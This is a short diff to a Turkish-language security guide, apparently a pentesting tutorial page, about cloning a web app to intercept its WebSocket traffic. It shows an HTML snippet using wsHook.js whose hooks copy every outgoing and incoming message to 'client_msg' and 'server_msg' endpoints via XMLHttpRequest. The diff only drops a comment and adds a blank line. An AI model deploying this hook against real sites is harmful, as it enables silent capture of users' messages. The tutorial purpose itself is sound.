@@ -124,13 +124,13 @@ Hedeflenen web uygulamasını taklit etmek için (.html dosyaları gibi) siteyi 
 ```html
 <script src='wsHook.js'></script>
 
-//Bu, bir mesaj gönderilmeden önce veya sunucudan alındıktan sonra çalışacak işlevlerdir
 <script>
 wsHook.before = function(data, url) {
     var xhttp = new XMLHttpRequest();
     xhttp.open("GET", "client_msg?m="+data, true);
     xhttp.send();
 }
+
 wsHook.after = function(messageEvent, url, wsObject) {
     var xhttp = new XMLHttpRequest();
     xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
